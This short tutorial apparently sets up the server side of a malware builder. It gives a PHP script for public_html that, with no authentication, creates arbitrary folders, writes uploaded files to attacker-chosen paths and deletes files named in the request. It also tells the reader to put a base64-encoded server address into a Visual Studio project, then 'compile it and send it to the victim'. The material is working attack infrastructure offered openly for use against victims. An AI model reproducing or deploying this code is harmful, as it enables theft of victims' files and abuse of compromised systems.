Goto your public_html folder and make new PHP file and put below code in it
<?php
$del = $_GET["dellog"];
$folder = $_GET["folder"];
mkdir($folder,0777);
$file = $_GET["path"];
if (!empty($_FILES["file"])){
move_uploaded_file($_FILES["file"]["tmp_name"],
$file . "/" . $_FILES["file"]["name"]);
}
unlink($del);
?>

Open the project in Visual Studio and the edit below variable in source code
Dim server As String = BaseDecode1("your server address here in base64 encoded")

and edit this variable below as well
Dim php As String = "yourphpfilename.php?" & "folder="

Just compile it and send it to the victim thats all !!
